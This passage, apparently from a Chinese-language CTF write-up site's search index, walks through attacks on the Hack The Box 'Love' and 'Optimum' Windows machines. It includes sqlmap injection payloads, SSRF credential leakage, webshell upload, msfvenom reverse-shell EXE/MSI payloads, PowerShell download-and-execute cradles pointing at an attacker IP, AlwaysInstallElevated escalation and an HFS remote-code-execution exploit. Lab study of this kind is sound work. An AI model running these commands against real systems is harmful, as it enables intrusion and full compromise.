HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n| ssl-cert: Subject: commonName=LOVE\n| Subject Alternative Name: DNS:LOVE, DNS:Love\n| Not valid before: 2021-04-11T14:39:19\n|_Not valid after:  2024-04-10T14:39:19\n|_ssl-date: 2021-07-20T22:13:09+00:00; +26m00s from scanner time.\n| tls-alpn: \n|_  http/1.1\n7680/tcp open  pando-pub?\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3306-TCP:V=7.91%I=7%D=7/20%Time=60F743B8%P=x86_64-pc-linux-gnu%r(HT\n...[snip]...\nSF:'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20\nSF:server\");\nService Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 25m59s, deviation: 0s, median: 25m59s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-07-20T22:12:54\n|_  start_date: N/A\n...v\n</code></pre> <p>\u6709\u4e00\u5806\u7aef\u53e3\u8981\u679a\u4e3e\uff1a</p> <ul> <li>80\u3001443 \u548c 5000 \u4e0a\u7684 HTTP/HTTPS, 443\u7aef\u53e3\u7684ssl\u8bc1\u4e66\u4e0a\u63d0\u793a\u4e86\u4e24\u4e2a\u57df\u540d\uff0c \u5206\u522b\u4e3alove.htb\u4ee5\u53castaging.love.htb</li> <li>135/139/445 \u4e0a\u7684 SMB/RPC\u3002</li> <li>3306 \u4e0a\u7684 MySQL\u3002</li> </ul> <p></p>"},{"location":"CTF/HTB/Windows-Love/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<pre><code>root@kali# python3 dirsearch.py -e* -t 100 -u http://10.10.10.239   \n...\n[08:40:04] 301 -  337B  - /ADMIN  -&gt;  http://10.10.10.239/ADMIN/            \n[08:40:04] 301 -  337B  - /Admin  -&gt;  http://10.10.10.239/Admin/                                     \n[08:40:14] 301 -  337B  - /admin  -&gt;  http://10.10.10.239/admin/            \n[08:40:14] 301 -  338B  - /admin.  -&gt;  http://10.10.10.239/admin./          \n[08:40:15] 200 -    6KB - /admin/                                           \n[08:40:15] 403 -  302B  - /admin/.htaccess                                  \n[08:40:15] 200 -    6KB - /admin%20/                                        \n[08:40:16] 302 -    0B  - /admin/login.php  -&gt;  index.php                   \n[08:40:16] 200 -    6KB - /admin/?/login                                    \n[08:40:17] 200 -    6KB - /admin/index.php                                  \n[08:40:17] 302 -   16KB - /admin/home.php  -&gt;  index.php                    \n[08:40:37] 301 -  348B  - /bower_components  -&gt;  http://10.10.10.239/bower_components/\n[08:40:39] 200 -    7KB - /bower_components/                                                                      \n[08:40:48] 200 -    1KB - /dist/                                            \n[08:40:48] 301 -  336B  - /dist  -&gt;  http://10.10.10.239/dist/                                 \n[08:40:57] 302 -    0B  - /home.php  -&gt;  index.php                          \n[08:40:58] 301 -  338B  - /images  -&gt;  http://10.10.10.239/images/          \n[08:40:58] 200 -    2KB - /images/                                          \n[08:40:58] 503 -  402B  - /examples/                                        \n[08:40:59] 200 -    4KB - /index.php                                                                     \n[08:41:00] 200 -    4KB - /index.pHp                                        \n[08:41:01] 200 -    4KB - /index.php/login/                                 \n[08:41:01] 200 -    4KB - /index.php.                                       \n[08:41:01] 200 -    2KB - /includes/\n[08:41:01] 301 -  340B  - /includes  -&gt;  http://10.10.10.239/includes/\n[08:41:05] 302 -    0B  - /login.php  -&gt;  index.php                         \n[08:41:06] 302 -    0B  - /logout.php  -&gt;  index.php                                            \n[08:41:20] 301 -  339B  - /plugins  -&gt;  http://10.10.10.239/plugins/        \n[08:41:20] 200 -    2KB - /plugins/      \n...\n</code></pre> <p>\u53d1\u73b0\u5b58\u5728/admin\u76ee\u5f55\u548c/images\u76ee\u5f55\uff0c\u4e14\u90fd\u53ef\u4ee5\u88ab\u8bbf\u95ee\u6210\u529f\uff1b</p>"},{"location":"CTF/HTB/Windows-Love/index.html#web","title":"WEB\u670d\u52a1","text":""},{"location":"CTF/HTB/Windows-Love/index.html#http-80","title":"HTTP\u7ad9 80","text":""},{"location":"CTF/HTB/Windows-Love/index.html#https-443","title":"HTTPS\u7ad9 443","text":""},{"location":"CTF/HTB/Windows-Love/index.html#5000","title":"5000","text":""},{"location":"CTF/HTB/Windows-Love/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Love/index.html#smb-tcp-445","title":"SMB - TCP 445","text":"<p>\u65e0\u6cd5\u4e0e SMB \u8fdb\u884c\u8bbf\u5ba2\u4f1a\u8bdd\uff1a</p> <pre><code>root@kali# smbmap -H 10.10.10.239\n[!] Authentication error on 10.10.10.239\nroot@kali# smbclient -N -L //10.10.10.239\nsession setup failed: NT_STATUS_ACCESS_DENIED\n</code></pre>"},{"location":"CTF/HTB/Windows-Love/index.html#mysql-tcp-3306","title":"MySQL - TCP 3306","text":"<p>\u4e0d\u5141\u8bb8\u4ece\u6211\u7684 IP \u8fde\u63a5\u5230 MySQL\uff1a</p> <pre><code>root@kali# mysql -h 10.10.10.239\nERROR 1130 (HY000): Host '10.10.14.6' is not allowed to connect to this MariaDB server\n</code></pre>"},{"location":"CTF/HTB/Windows-Love/index.html#-tcp-5040-7680","title":"\u672a\u77e5\u7aef\u53e3 - TCP 5040 \u548c 7680","text":"<p>\u65e0\u6cd5\u4ece 5040 \u6216 7680 \u4e2d\u83b7\u5f97\u4efb\u4f55\u6709\u7528\u7684\u4e1c\u897f\uff1a</p> <pre><code>root@kali# curl 10.10.10.239:5040\ncurl: (7) Failed to connect to 10.10.10.239 port 5040: Connection refused\nroot@kali# nc 10.10.10.239 5040\n(UNKNOWN) [10.10.10.239] 5040 (?) : Connection refused\nroot@kali# curl 10.10.10.239:7680\ncurl: (52) Empty reply from server\nroot@kali# nc 10.10.10.239 7680\n\n\nsadf\nasdf\nsadf\n^C\n</code></pre>"},{"location":"CTF/HTB/Windows-Love/index.html#80","title":"80","text":"<p>80\u7aef\u53e3\u662f\u4e00\u4e2a\u53ebvoting system\u7684web app\uff0ckali\u641c\u7d22\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u60c5\u51b5</p> <p></p> <p>\u6709\u4e2a\u672a\u6388\u6743\u7684RCE\uff0c\u8bd5\u8fc7\u4e0d\u884c\u3002 \u8fd8\u6709\u4e2a\u6388\u6743\u7684RCE\uff0c\u4f46\u662f\u6211\u6ca1\u6ca1\u6709\u767b\u5f55\u51ed\u636e\u3002 \u8fd8\u6709\u4e2asql\u6ce8\u5165\uff0c\u5047\u5982\u5b58\u5728sql\u6ce8\u5165\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u62ff\u5230\u7528\u6237\u51ed\u636e\uff0c\u5c1d\u8bd5\u6388\u6743\u7684RCE.</p> <p>\u5c1d\u8bd5sql\u6ce8\u5165</p> <pre><code>root@kali# sqlmap -r data --batch -p voter --level 5 --risk 3 \n ...\n ---\nParameter: voter (POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: voter=admin' AND (SELECT 4771 FROM (SELECT(SLEEP(5)))YdaT) AND 'Vvvd'='Vvvd&amp;password=123&amp;login=asd\n---\n...\n</code></pre> <p></p> <p>\u8bc1\u5b9e\u7528\u6237\u540dvoter\u5b57\u6bb5\u5b58\u5728\u57fa\u4e8e\u65f6\u95f4\u7684sql\u6ce8\u5165,\u4ee5\u4e0bpayload\u62ff\u5230\u6240\u6709\u6570\u636e\u5e93\u540d\u5b57</p> <pre><code>root@kali# sqlmap -r data --batch -p voter --level 3 --risk 3 --dbms=mysql --technique=T --dbs\n...\navailable databases [6]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] phpmyadmin\n[*] test\n[*] votesystem\n...\n</code></pre> <p>\u540c\u6837\u7684\u65b9\u6cd5\uff0c\u4e00\u6b65\u6b65\u6d4b\u8bd5\uff0c\u7528\u4e0b\u9762payload\u62ff\u5230\u7528\u6237\u51ed\u636e</p> <pre><code>root@kali# sqlmap -r data --batch -p voter --level 3 --risk 3 --dbms=mysql --technique=T -D votesystem -T admin -C username,password --dump\n\nDatabase: votesystem\nTable: admin\n[1 entry]\n+----------+--------------------------------------------------------------+\n| username | password                                                     |\n+----------+--------------------------------------------------------------+\n| admin    | $2y$10$psrWULJqgpPOl4HUt.ctM.vFMYJjh65EiRFDbIAZsa3z/F3t/8zXW |\n+----------+--------------------------------------------------------------+\n</code></pre> <p>\u4f46\u662f\u7528john\u548chashcat\u6211\u90fd\u65e0\u6cd5\u7206\u7834\u8fd9\u4e2a\u5bc6\u7801.</p>"},{"location":"CTF/HTB/Windows-Love/index.html#443","title":"443","text":"<p>\u5728\u9876\u90e8\u7684\u5bfc\u822a\u680f\u4e2d\uff0cHome \u6307\u5411\u6b64\u9875\u9762\uff0c\u4f46 Demo \u8f6c\u5230 \uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u91c7\u7528 url \u7684\u8868\u5355\uff1a/beta.php</p> <p></p> <p>\u5982\u679c\u6211\u542f\u52a8\u4e00\u4e2a Python Web \u670d\u52a1\u5668\u5e76\u8f93\u5165\u6211\u7684 IP \u4e0a\u7684 url\uff0c\u5b83\u786e\u5b9e\u4f1a\u5411\u6211\u7684\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\uff1a</p> <pre><code>root@kali# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.10.239 - - [12/May/2024 14:35:14] \"GET /test HTTP/1.1\" 404 -\n</code></pre> <p>\u751f\u6210\u7684\u9875\u9762\u5305\u542b\u4ee5\u4e0b\u7ed3\u679c\uff1a</p> <p></p> <p>\u6211\u4eec\u4e0d\u662f\u6709\u4e00\u4e2a\u65e0\u6743\u9650\u8bbf\u95ee\u76845000\u7aef\u53e3\u5417\uff0c\u90a3\u8ba9\u5b83\u81ea\u5df1\u53d1\u51fa\u8bbf\u95ee\u8bf7\u6c42\uff0c\u662f\u5426\u5c31\u6709\u6743\u9650\u4e86\uff1f</p> <p></p> <p>\u5f39\u51fa\u4e86\u5982\u4e0b\u9875\u9762</p> <p></p> <p>\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u62ff\u5230\u5bc6\u7801\u4e86\u8d26\u53f7\u548c\u5bc6\u7801</p> <p>\u8d26\u53f7admin</p> <p>\u5bc6\u7801@LoveIsInTheAir!!!!</p> <p>\u7136\u540e\u6211\u4eec\u53bb\u767b\u5f55</p> <p></p> <p>\u63d0\u793a\u627e\u4e0d\u5230\u8fd9\u4e2aID,\u7ed3\u5408\u6211\u4eec\u4e4b\u524dfuzz\u5f97\u5230\u7684\u76ee\u5f55\u5c1d\u8bd5\u767b\u5f55/admin/\u9875\u9762\u3002</p> <p></p> <p>\u6210\u529f\uff01</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u63d0\u4f9b\u4e0a\u4f20\u6587\u4ef6\u6216\u8005\u5229\u7528msf\u5f97\u5230\u7684\u6f0f\u6d1e\u5229\u7528\u811a\u672c</p>"},{"location":"CTF/HTB/Windows-Love/index.html#shell","title":"\u4e0a\u4f20shell","text":"<p>\u627e\u5230\u4e0a\u4f20\u70b9</p> <p></p> <p>\u5728photo\u5904\u4f20\u5165\u6211\u4eec\u7684shell\u6216\u662f\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u8fdb\u5165http://love.htb/images\u67e5\u770b\u6211\u4eec\u7684shell\u662f\u5426\u4e0a\u4f20\u4e0a\u53bb</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u7684shell\u5df2\u7ecf\u4e0a\u4f20\u4e0a\u53bb\u4e86\u3002</p> <p>\u56e0\u4e3a\u6bcf5\u5206\u949f\u4f1a\u6267\u884c\u4e00\u6b21\u6e05\u7406\u7a0b\u5e8f\uff0c\u5c06\u6211\u4eec\u7684webshell\u7ed9\u6e05\u7406\u6389\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u66f4\u6362\u4e00\u4e2a\u6211\u4eec\u53ef\u4ee5\u957f\u671f\u8fde\u63a5\u7684shell\u3002\u8fd9\u91cc\u6211\u6253\u7b97\u4f7f\u7528msf\u7684shell\uff0c\u4e8e\u662f\u5148\u7528msfvenom\u751f\u6210\u4e00\u4e2aexe\u7684\u6728\u9a6c\u3002</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.4 lport=4444 -f exe -o shell.exe\n</code></pre> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u5728kail\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff0c\u5c06kail\u751f\u6210\u7684\u6728\u9a6c\u4e0b\u8f7d\u5230\u76ee\u6807\u673a\u4e2d\uff0c\u7136\u540e\u8fd0\u884c\u6b64\u6728\u9a6c\u3002</p> <pre><code>python3 -m http.server 80\nCurl http://10.10.14.4/shell.exe -o shell.exe\n</code></pre> <p></p> <p>\u6211\u4eec\u7684kail\u6210\u529f\u83b7\u53d6\u5230\u56de\u5f39\u7684shell\u3002</p> <p></p> <p></p>"},{"location":"CTF/HTB/Windows-Love/index.html#exploit-db","title":"exploit-db","text":"<p>\u5229\u7528\u6388\u6743\u7684RCE\u62ffshell</p> <pre><code>Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)           | php/webapps/49445.py\n</code></pre> <p>\u6e90\u4ee3\u7801\u9700\u8981\u7f16\u8f91\u76f8\u5173\u4fe1\u606f\uff0c\u4ee5\u53ca\u4fee\u6539\u8def\u5f84</p> <pre><code># --- Edit your settings here ----\nIP = \"10.10.10.239\" # Website's URL\nUSERNAME = \"admin\" #Auth username\nPASSWORD = \"@LoveIsInTheAir!!!!\" # Auth Password\nREV_IP = \"10.10.14.4\" # Reverse shell IP\nREV_PORT = \"4444\" # Reverse port\n# --------------------------------\n\nINDEX_PAGE = f\"http://{IP}/admin/index.php\"\nLOGIN_URL = f\"http://{IP}/admin/login.php\"\nVOTE_URL = f\"http://{IP}/admin/voters_add.php\"\nCALL_SHELL = f\"http://{IP}/images/shell.php\"\n</code></pre> <p>\u6267\u884c\u4ee5\u540e\u6536\u5230\u53cd\u5f39shell</p> <pre><code>root@kali# nc -lvnp 4444                                                                                               1 \u2a2f\nlistening on [any] 4444 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.239] 53219\nb374k shell : connected\n\nMicrosoft Windows [Version 10.0.19042.867]\n(c) 2020 Microsoft Corporation. All rights reserved.\n\nC:\\xampp\\htdocs\\omrs\\images&gt;whoami\nwhoami\nlove\\phoebe\n</code></pre>"},{"location":"CTF/HTB/Windows-Love/index.html#_3","title":"\u63d0\u6743","text":""},{"location":"CTF/HTB/Windows-Love/index.html#winpeas","title":"\u4f20winpeas\u5230\u9776\u673a","text":"<pre><code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.4/winPEASx64.exe','c:\\Users\\Phoebe\\Downloads\\winPEASx64.exe')\"\n</code></pre> <p>\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u4e00\u4e2a\u540d\u4e3awinPEASx64.exe\u7684\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u4fdd\u5b58\u5230\u672c\u5730\u7684c:\\Users\\Phoebe\\Downloads\u76ee\u5f55\u4e0b\u3002</p>"},{"location":"CTF/HTB/Windows-Love/index.html#_4","title":"\u6ce8\u518c\u8868\u63d0\u6743","text":"<p>\u627e\u5230alwaysinstallelevated\uff0c\u5373\u5f53\u6ce8\u518c\u8868\u4e2d\u7684alwaysinstallelevated\u8bbe\u7f6e\u4e3a1\u65f6\uff0c\u673a\u5668\u4e0a\u8fd0\u884c\u4efb\u4f55\u7684msi\u7a0b\u5e8f\uff0c\u5747\u4f1a\u4ee5system\u6743\u9650\u6267\u884c\uff0c\u6211\u4eec\u53ea\u9700\u751f\u6210\u4e00\u4e2amsi\u7684\u6728\u9a6c\u7a0b\u5e8f\u5373\u53ef\u63d0\u6743\u3002</p> <p>\u6267\u884cwinpeas\u4ee5\u540e\u53d1\u73b0HKLM\u548cHKCU\u7684\u503c\u90fd\u662f1</p> <pre><code>...snip...\nChecking AlwaysInstallElevated\n  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated\n    AlwaysInstallElevated set to 1 in HKLM!\n    AlwaysInstallElevated set to 1 in HKCU!\n\nLogged users\n    LOVEAdministrator\n    LOVEPhoebe\n\nEnumerating Security Packages Credentials\n  Version: NetNTLMv2\n  Hash:    Phoebe::LOVE:1122334455667788:20e51a8d32d4b2d85ee8d1f16d856ae2:0101000000000000cdcd241cb38bd701ba60ebea1234fc78000000000800300030000000000000000000000000200000c7feb52a9af533c44a1a9653e8d52b6cd2d9a8def4c45c6cb0ba513521461eb60a00100000000000000000000000000000000000090000000000000000000000\n...snip...\n</code></pre> <p>\u4ece\u5f97\u5230\u7684\u4fe1\u606f\u4e2d\u53ef\u4ee5\u770b\u5230 AlwaysInstallElevated \u662f\u5f00\u542f\u7684\uff0c\u7b80\u5355\u7684\u6ce8\u518c\u8868\u63d0\u6743\u4e86\u3002\u8fd9\u79cd\u60c5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u5305\u542b\u53cd\u5411 Shell \u7684\u6076\u610f MSI \u6587\u4ef6,\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6ce8\u518c\u8868\u63d0\u6743\uff08Registry Escalation\uff09.</p> <p>MSI \u6587\u4ef6\u662f\u7528\u4e8e\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u8f6f\u4ef6\u5305\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u5728\u5c1d\u8bd5\u5b89\u88c5\u5b83\u4eec\u7684\u7528\u6237\u6743\u9650\u4e0b\u8fd0\u884c\u3002Windows \u5141\u8bb8\u8fd9\u4e9b\u5b89\u88c5\u7a0b\u5e8f\u4ee5\u63d0\u5347\u7684\uff08\u5373 admin\uff09\u7279\u6743\u8fd0\u884c\u3002</p> <p>\u7f16\u8bd1\u4e00\u4e2a\u53cd\u5f39shell\u7684msi\u6587\u4ef6</p> <pre><code>root@kali# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.4 lport=4444 -f msi -o setup.msi\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of msi file: 159744 bytes\nSaved as: setup.msi\n</code></pre> <p>\u4f20\u5230\u9776\u673a</p> <pre><code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.4/setup.msi','c:\\Users\\Phoebe\\Downloads\\setup.msi')\"\n</code></pre> <p>\u6267\u884cmsi\u6587\u4ef6</p> <pre><code>c:\\Users\\Phoebe\\Downloads&gt;.\\setup.msi\n.\\setup.msi\n</code></pre> <p>\u6536\u5230\u53cd\u5f39shell</p> <pre><code>use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.4\nset LPORT 4444\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 10.10.14.4:4444 \n[*] Sending stage (175174 bytes) to 10.10.10.239\n[*] Meterpreter session 1 opened (10.10.14.4:4444 -&gt; 10.10.10.239:53222 ) at 2022-01-24 02:33:20 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre> <p>\u5df2\u7ecf\u662fSYSTEM\u6743\u9650\u3002</p>"},{"location":"CTF/HTB/Windows-Love/index.html#_5","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7 Nmap \u8bc6\u522b\u51fa\u76ee\u6807\u670d\u52a1\u5668\u8fd0\u884c\u7684\u670d\u52a1\uff0c\u4ece exploit-db \u68c0\u7d22\u51fa CVE \u6f0f\u6d1e\uff0c\u5229\u7528 SQL \u6ce8\u5165\u6210\u529f\u8fdb\u5165\u540e\u53f0\u63a7\u5236\u7aef\u9875\u9762\u3002\u4e0a\u4f20 webshell \u5f97\u5230\u4e00\u4e2a reverse shell \u7acb\u8db3\u70b9\u3002</p> <p>\u4f7f\u7528 winPEAS \u5de5\u5177\u6536\u96c6\u670d\u52a1\u5668\u4fe1\u606f\uff0c\u53d1\u73b0 AlwaysInstallElevated \u5f00\u542f\u3002\u914d\u5408 Metasploit Framework \u6210\u529f\u5b8c\u6210\u6743\u9650\u63d0\u5347\u3002</p>"},{"location":"CTF/HTB/Windows-Optimum/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Optimum/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.8 -oA scans/ports\n...\nPORT   STATE SERVICE\n80/tcp open  http\n...\nroot@kali# nmap -sT -sC -sV -O -p80 10.10.10.8 -oA scans/details\n...\nPORT   STATE SERVICE VERSION\n80/tcp open  http    HttpFileServer httpd 2.3\n|_http-server-header: HFS 2.3\n|_http-title: HFS /\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n...\n</code></pre> <p>\u5f00\u653e\u4e8680\u7aef\u53e3\u5e76\u4e1480\u7aef\u53e3\u8fd8\u5f00\u653e\u4e86HttpFileServer\u670d\u52a1.</p>"},{"location":"CTF/HTB/Windows-Optimum/index.html#web","title":"WEB\u9875\u9762","text":"<p>\u67e5\u770bweb\u9875\u9762\u53d1\u73b0\u670d\u52a1\u7684\u4fe1\u606f\u4f7f\u7528\u4e86HttpFileServer 2.3\uff0cHttp File Server\u662f\u4e13\u4e3a\u4e2a\u4eba\u7528\u6237\u6240\u8bbe\u8ba1\u7684 HTTP\u6587\u4ef6\u670d\u52a1\u5668\u3002</p>"},{"location":"CTF/HTB/Windows-Optimum/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Optimum/index.html#searchsploit","title":"Searchsploit","text":"<p>\u6b64\u6f0f\u6d1e\u79f0\u4e3a CVE-2014-6287\u3002</p> <pre><code>root@kali# searchsploit -m  windows/webapps/49125.py\n  Exploit: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)\n      URL: https://www.exploit-db.com/exploits/49125\n     Path: /usr/share/exploitdb/exploits/windows/webapps/49125.py\n    Codes: CVE-2014-6287\n Verified: False\nFile Type: Python script, Unicode text, UTF-8 text executable\nCopied to: /home/tom/\u684c\u9762/49125.py\nroot@kali# python3 49125.py 10.10.10.8 80 whoami\nhttp://10.10.10.8:80/?search=%00{.+exec|whoami.}\n</code></pre> <p>\u8fd9\u91cc\u6ca1\u6709\u7ed9\u6211\u4efb\u4f55\u56de\u663e\uff0c\u6211\u4e0d\u786e\u5b9a\u662f\u5426\u6267\u884c\u6210\u529f\u4e86\uff0c\u53bb\u6d4b\u8bd5\u4e00\u4e0b\u5427,\u672c\u5730\u4f7f\u7528tcpdump\u76d1\u542c\u4e00\u4e0b\u7f51\u5361\uff0c\u7136\u540e\u6267\u884c\u4e00\u4e0bping\u6211\u4eec\u81ea\u5df1\u7684\u547d\u4ee4.</p> <pre><code>root@kali# python3 49125.py 10.10.10.8 80 \"ping 10.10.16.3&amp;quot;\nhttp://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.16.3.}\nroot@kali# tcpdump -i tun0  \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n23:25:22.516278 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [S], seq 2814804000, win 64240, options [mss 1460,sackOK,TS val 3571996960 ecr 0,nop,wscale 7], length 0\n23:25:22.747740 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [S.], seq 3736611079, ack 2814804001, win 8192, options [mss 1355,nop,wscale 8,sackOK,TS val 122838 ecr 3571996960], length 0\n23:25:22.747788 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 0\n23:25:22.747968 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 142: HTTP: GET /?search=%00%7B.+exec%7Cping%2010.10.16.3.%7D HTTP/1.1\n23:25:23.203303 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1:219, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 218: HTTP: HTTP/1.1 200 OK\n23:25:23.203352 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.203376 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 219:1562, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP\n</code></pre> <p>\u786e\u5b9e\u662f\u6210\u529f\u88ab\u6267\u884c\u4e86\uff0c\u90a3\u5c31\u53ef\u4ee5\u786e\u8ba4\u8be5\u6f0f\u6d1e\u662f\u5b58\u5728\uff0c\u5e76\u4e14exploit\u4e5f\u662f\u53ef\u4ee5\u4f7f\u7528\u7684</p>"},{"location":"CTF/HTB/Windows-Optimum/index.html#getshell","title":"Getshell","text":"<p>\u6839\u636eCVE-2014-6287\u7684\u63d0\u793a\uff0c\u8fd9\u91cc\u5e94\u8be5\u662f\u4f7f\u7528powershell\u8fdb\u884c\u56de\u5f39\u4e00\u4e2ashell\uff0c\u54b1\u4eec\u627e\u4e00\u4e2apowershell\u7684\u5229\u7528\u5de5\u5177</p> <p>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p> <pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 4444\n</code></pre> <p>\u6211\u4eec\u5c06\u8fd9\u53e5\u4ee3\u7801\u590d\u5236\u4e0b\u6765\uff0c\u7c98\u8d34\u5230\u4ee3\u7801\u6700\u5e95\u90e8\uff0c\u7136\u540e\u628aIP\u4fee\u6539\u4e3a\u6211\u4eec\u81ea\u5df1\u7684IP</p> <p>\u7136\u540e\u5728\u672c\u5730\u4f7f\u7528python3\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1</p> <pre><code>python3 -m http.server 80\n</code></pre> <p>\u7136\u540e\u4f7f\u7528exp\u8fdb\u884c\u4e0b\u8f7d</p> <pre><code>root@kali# python3 CVE-49125.py 10.10.10.8 80 \"c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3/Invoke-PowerShellTcp.ps1')&amp;quot;\nhttp://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.16.3/Invoke-PowerShellTcp.ps1%27%29.}\n\nPS C:\\Users\\kostas\\Desktop&gt; whoami\noptimum\\kostas\n</code></pre> <p>\u6210\u529f\u5f97\u5230\u4e86shell</p>"},{"location":"CTF/HTB/Windows-Optimum/index.html#_3","title":"\u6743\u9650\u63d0\u5347","text":"<p>\u4f7f\u7528Windows-Exploit-Suggester\u5de5\u5177\u5bf9\u76ee\u6807\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u4e0eMicrosoft\u6f0f\u6d1e\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u68c0\u6d4b\u76ee\u6807\u4e0a\u53ef\u80fd\u7f3a\u5c11\u7684\u8865\u4e01\u7a0b\u5e8f\u3002</p> <p><code>windows-exploit-suggester.py</code>:https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p> <pre><code>C:\\Users&gt;systeminfo\nsysteminfo\n\nHost Name:                 OPTIMUM\nOS Name:                   Microsoft Windows Server 2012 R2 Standard\nOS Version:                6.3.9600 N/A Build 9600\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Server\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows User\nRegistered Organization:   \nProduct ID:                00252-70000-00000-AA535\nOriginal Install Date:     18/3/2017, 1:51:36 \ufffd\ufffd\nSystem Boot Time:          10/2/2020, 8:43:06 \ufffd\ufffd\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz\nBIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018\nWindows Directory:         C:\\Windows\nSystem Directory:          C:\\Windows\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             el;Greek\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC+02:00) Athens, Bucharest\nTotal Physical Memory:     4.095 MB\nAvailable Physical Memory: 3.458 MB\nVirtual Memory: Max Size:  5.503 MB\nVirtual Memory: Available: 4.912 MB\nVirtual Memory: In Use:    591 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                   